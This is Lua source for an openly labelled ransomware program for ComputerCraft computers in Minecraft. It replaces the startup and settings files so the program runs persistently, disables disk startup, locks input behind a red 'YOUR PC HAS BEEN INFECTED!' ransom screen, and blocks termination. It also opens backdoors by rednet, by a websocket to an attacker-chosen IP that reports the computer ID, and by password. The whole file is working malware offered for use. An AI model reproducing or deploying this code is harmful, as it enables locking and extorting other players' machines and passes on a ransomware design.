terminalAccess = true --do you have access to the read() function?
--if above is true, these are auto settings--
rednetBackDoor = "" -- -1 for none, the id for the backdoor via rednet
websocketBackDoor = "" -- nil for none, ip adress for websocket backdoor
passwordBackDoor = ""
topMessage = "contact @Hello_human for assistance." --top message
bottomMessage = "files/pc at ransom, all inputs locked." --bottom message




if not settings.get("run") then
    fs.makeDir("oldVFiles")
    if fs.exists(".settings") then fs.move(".settings","oldVFiles/.settings") end
    if fs.exists("startup") then fs.move("startup","oldVFiles/startup") end
    if fs.exists("startup.lua") then fs.move("startup.lua","oldVFiles/startup.lua") end
    
    f = fs.open("startup.lua","w")
    f.write('while true do os.run({},"virus.lua") end')
    f.close()

    f = fs.open(".settings","w")
    f.write('{ [ "shell.allow_disk_startup" ] = false, run=true}')
    f.close()


    settings.clear()
    settings.load(".settings")
    if terminalAccess then
        print('rednet backdoor id ("" for none):')
        settings.set("RdId",read())
        print('websocket backdoor ip ("" for none):')
        settings.set("WsIp",read())
        print('password backdoor ip ("" for none):')
        settings.set("pass",read())
        print("top message:")
        settings.set("top",read())
        print("bottom message:")
        settings.set("bottom",read())
    else
        settings.set("RdId",rednetBackDoor)
        settings.set("WsIp",websocketBackDoor)
        settings.set("pass",passwordBackDoor)
        settings.set("top",topMessage)
        settings.set("bottom",BottomMessage)
    end
    settings.save(".settings")
    os.reboot()
end




function write(text, y)
    if #text <= termX then
        term.setCursorPos(termX/2-#text/2+1, y)
        term.write(text)
    else
        current = text
        for i = 0,math.ceil(#text/termX)-1 do
            temp = string.sub(current,i*termX+1, math.min(termX,#current)+i*termX)
            term.setCursorPos(termX/2-#temp/2+1, y+i)
            term.write(temp)
        end
    end
end

function menu()
    term.setBackgroundColor(colors.red)
    term.clear()
    term.setTextColor(colors.black)
    write("YOUR PC HAS BEEN INFECTED!",2)
    write(settings.get("top"),4)
    write(settings.get("bottom"),8)
    
    if settings.get("RdId") ~= "" then
        term.setCursorPos(termX-4,termY-1)
        term.write("rd: "..os.getComputerID())
    end
    if settings.get("WsIp") ~= "" then
        term.setCursorPos(termX-4,termY-2)
        term.write("ws: "..os.getComputerID())
    end
    if settings.get("pass") ~= "" then
        paintutils.drawBox(termX-5,termY,termX,termY,colors.black)
        term.setCursorPos(termX-4,termY)
        term.setTextColor(colors.red)
        term.write("pass")
    end
end

function undo()
    fs.delete("startup.lua")
    fs.delete("virus.lua")
    fs.delete(".settings")
    fs.delete("oldVFiles")
    if fs.exists("oldVFiles/.settings") then fs.move("oldVFiles/.settings",".settings") end
    if fs.exists("oldVFiles/startup") then fs.move("oldVFiles/startup","startup") end
    if fs.exists("oldVFiles/startup.lua") then fs.move("oldVFiles/startup.lua","startup.lua") end
    os.reboot()
end


termX, termY = term.getSize()

if settings.get("RdId") ~= "" then
    modem = peripheral.find("modem")
    if modem then rednet.open(peripheral.getName(modem)) end
end

if settings.get("WsIp") ~= "" then
    ws = http.websocket(settings.get("WsIp"))
    if ws then
        ws.send(tostring(os.getComputerID()))
        if ws.receive() == "valid" then undo() end
    end
end


menu()
while true do
    event, v2, v3, v4 = os.pullEventRaw()
    menu()
    if event == "terminate" then
        term.setCursorPos(1, termY)
        term.setBackgroundColor(colors.red)
        term.setTextColor(colors.black)
        term.write("you cant fix this on your own.")
        os.startTimer(2)
    elseif event == "rednet_message" then
        if tostring(v2) == settings.get("RdId") and v3 == tostring(os.getComputerID()) then undo() end
        os.startTimer(2)
    elseif event == "mouse_click" then
        if v3 >= termX-5 and v4 == termY and settings.get("pass") ~= "" then
            term.clear()
            term.setCursorPos(1,1)
            term.write("password:")
            term.setCursorPos(1,2)
            if settings.get("pass") == read("*") then undo()
            else print("incorrect!") end
        end
        os.startTimer(2)
        os.sleep(2)
    end
end